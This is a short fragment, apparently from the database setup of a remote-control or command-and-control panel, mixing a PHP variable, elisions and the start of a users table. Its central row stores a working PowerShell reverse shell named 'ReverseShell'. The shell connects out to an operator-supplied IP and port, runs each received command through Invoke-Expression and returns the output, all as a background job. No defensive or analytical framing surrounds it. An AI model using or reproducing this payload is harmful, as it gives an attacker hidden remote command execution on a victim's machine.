...
$REQUEST_SCHEME="http";
            ...
            (99, 'ReverseShell', '\$shell = { do { Start-Sleep -Seconds 1; try { $TCPClient = New-Object Net.Sockets.TCPClient('$a1', '$a2') } catch {} } until ($TCPClient.Connected); $NetworkStream = $TCPClient.GetStream(); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); function WriteToStream ($String) { [byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % { 0 }; $StreamWriter.Write($String + 'ReHTTP :  '); $StreamWriter.Flush() }; WriteToStream ''; while (($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) { $Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1); $Output = try { Invoke-Expression $Command 2>&1 | Out-String } catch { $_ | Out-String }; WriteToStream ($Output) }; $StreamWriter.Close() } Start-Job  $shell', 2, 'IP,PORT', 1);
            CREATE TABLE `users` (
              `id` int(11) NOT NULL,
